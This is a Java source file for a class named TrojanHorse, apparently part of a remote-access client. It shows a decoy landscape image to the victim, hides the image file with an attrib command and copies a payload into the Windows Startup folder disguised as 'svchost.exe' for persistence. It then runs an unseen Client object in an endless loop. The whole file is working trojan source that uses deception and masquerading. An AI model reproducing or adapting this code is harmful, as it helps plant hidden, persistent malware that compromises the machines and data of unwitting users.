package client;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.nio.file.Files;
import java.util.UUID;

public class TrojanHorse
{
    public static void main(String[] args)
    {
        final String startUpPath = "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
        String startUpDirectory = System.getProperty("user.home") + startUpPath;

        boolean firstTime = !System.getProperty("user.dir").equalsIgnoreCase(startUpDirectory);
        if(firstTime)
        {
            new TrojanHorse();

            File source = new File("readme.txt");
            File destination = new File(startUpDirectory + "\\svchost.exe");
            try
            {
                Files.copy(source.toPath(),destination.toPath());
            }
            catch (IOException e)
            {
                e.printStackTrace();
            }
        }

        UUID uniqueId = UUID.randomUUID();
        Client client = new Client(uniqueId);

        while (true)
        {
            client.run();
        }
    }

    public TrojanHorse()
    {
        try {
            String filename = "/resources/landscape.jpg";

            InputStream resourceAsStream = getClass().getResourceAsStream(filename);
            BufferedImage image = ImageIO.read(resourceAsStream);

            File file = new File("IMG_01638120.jpg");
            Runtime.getRuntime().exec("attrib +H IMG_01638120.jpg");
            ImageIO.write(image,"jpg", file);

            Desktop desktop = Desktop.getDesktop();
            desktop.open(file);

        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}